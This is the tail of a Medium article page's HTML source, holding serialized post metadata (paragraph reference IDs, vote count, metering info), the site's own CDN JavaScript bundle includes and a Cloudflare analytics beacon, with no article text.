,"items":[{"__ref":"Post:365c93def04e"},{"__ref":"Post:3805e8763dd5"},{"__ref":"Post:393c09f55eae"},{"__ref":"Post:39313ca23ef5"},{"__ref":"Post:38daa9e9bdc5"},{"__ref":"Post:38c6f16eacc8"},{"__ref":"Post:39424ac52a18"},{"__ref":"Post:38ec4ba04783"}]},"collaborators":[],"translationSourcePost":null,"inResponseToMediaResource":null,"audioVersionUrl":"","seoTitle":"","updatedAt":1552587683384,"shortformType":"SHORTFORM_TYPE_LINK","structuredData":"","seoDescription":"","postResponses":{"__typename":"PostResponses","count":0},"latestPublishedVersion":"85fe16ec578d","isPublishToEmail":false,"voterCount":24,"recommenders":[],"content({})":{"__typename":"PostContent","isLockedPreviewOnly":false,"validatedShareKey":"","bodyModel":{"__typename":"RichText","paragraphs":[{"__ref":"Paragraph:85fe16ec578d_0"},{"__ref":"Paragraph:85fe16ec578d_1"},{"__ref":"Paragraph:85fe16ec578d_2"},{"__ref":"Paragraph:85fe16ec578d_3"},{"__ref":"Paragraph:85fe16ec578d_4"},{"__ref":"Paragraph:85fe16ec578d_5"},{"__ref":"Paragraph:85fe16ec578d_6"},{"__ref":"Paragraph:85fe16ec578d_7"},{"__ref":"Paragraph:85fe16ec578d_8"},{"__ref":"Paragraph:85fe16ec578d_9"},{"__ref":"Paragraph:85fe16ec578d_10"},{"__ref":"Paragraph:85fe16ec578d_11"},{"__ref":"Paragraph:85fe16ec578d_12"},{"__ref":"Paragraph:85fe16ec578d_13"},{"__ref":"Paragraph:85fe16ec578d_14"},{"__ref":"Paragraph:85fe16ec578d_15"},{"__ref":"Paragraph:85fe16ec578d_16"},{"__ref":"Paragraph:85fe16ec578d_17"},{"__ref":"Paragraph:85fe16ec578d_18"},{"__ref":"Paragraph:85fe16ec578d_19"},{"__ref":"Paragraph:85fe16ec578d_20"},{"__ref":"Paragraph:85fe16ec578d_21"},{"__ref":"Paragraph:85fe16ec578d_22"},{"__ref":"Paragraph:85fe16ec578d_23"},{"__ref":"Paragraph:85fe16ec578d_24"},{"__ref":"Paragraph:85fe16ec578d_25"},{"__ref":"Paragraph:85fe16ec578d_26"},{"__ref":"Paragraph:85fe16ec578d_27"},{"__ref":"Paragraph:85fe16ec578d_28"},{"__ref":"Paragraph:85fe16ec578d_29"},{"__ref":"Paragraph:85fe16ec578d_30"},{"__ref":"Paragraph:85fe16ec578d_31"},{"__ref":"Paragraph:85fe16ec578d_32"},{"__ref":"Paragraph:85fe16ec578d_33"},{"__ref":"Paragraph:85fe16ec578d_34"},{"__ref":"Paragraph:85fe16ec578d_35"},{"__ref":"Paragraph:85fe16ec578d_36"},{"__ref":"Paragraph:85fe16ec578d_37"},{"__ref":"Paragraph:85fe16ec578d_38"},{"__ref":"Paragraph:85fe16ec578d_39"},{"__ref":"Paragraph:85fe16ec578d_40"},{"__ref":"Paragraph:85fe16ec578d_41"},{"__ref":"Paragraph:85fe16ec578d_42"},{"__ref":"Paragraph:85fe16ec578d_43"},{"__ref":"Paragraph:85fe16ec578d_44"},{"__ref":"Paragraph:85fe16ec578d_45"},{"__ref":"Paragraph:85fe16ec578d_46"},{"__ref":"Paragraph:85fe16ec578d_47"},{"__ref":"Paragraph:85fe16ec578d_48"},{"__ref":"Paragraph:85fe16ec578d_49"},{"__ref":"Paragraph:85fe16ec578d_50"},{"__ref":"Paragraph:85fe16ec578d_51"},{"__ref":"Paragraph:85fe16ec578d_52"},{"__ref":"Paragraph:85fe16ec578d_53"},{"__ref":"Paragraph:85fe16ec578d_54"},{"__ref":"Paragraph:85fe16ec578d_55"},{"__ref":"Paragraph:85fe16ec578d_56"}],"sections":[{"__typename":"Section","name":"9173","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}]}}},"MeteringInfo:{}":{"__typename":"MeteringInfo","postIds":[],"maxUnlockCount":3,"unlocksRemaining":0}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"HIT"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.32733017.js"></script><script src="https://cdn-client.medium.com/lite/static/js/6484.96815e61.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.23bdaf70.js"></script><script src="https://cdn-client.medium.com/lite/static/js/5573.159bf40f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/instrumentation.8ea15b6a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.65aadb14.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1752.a348f767.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/953.19c0a4db.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3211.3e30b0d8.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4586.0206cca1.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9692.b4a02f3e.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5064.7974654b.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9046.8e42140f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2846.012d369f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2176.958ba593.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2712.a43f33d4.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9972.f6abd8ac.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5828.582128b9.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2955.12744204.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7131.faa9f1cc.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/664.68f7c552.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8751.a9b26c9a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2238.af816699.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5009.dbfd66e8.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4803.15ea4361.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8127.7b79de8f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6371.bfa476ae.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8995.7ff30d72.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5435.7a0af391.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3874.3f41bcb9.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1794.574e0f73.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9454.d9a3a4a8.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/Post.50144cfa.chunk.js"></script><script>window.main();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"rayId":"653ac352f800016e","token":"0b5f665943484354a59c39c6833f7078","version":"2021.5.1","si":10}'></script>
</body></html>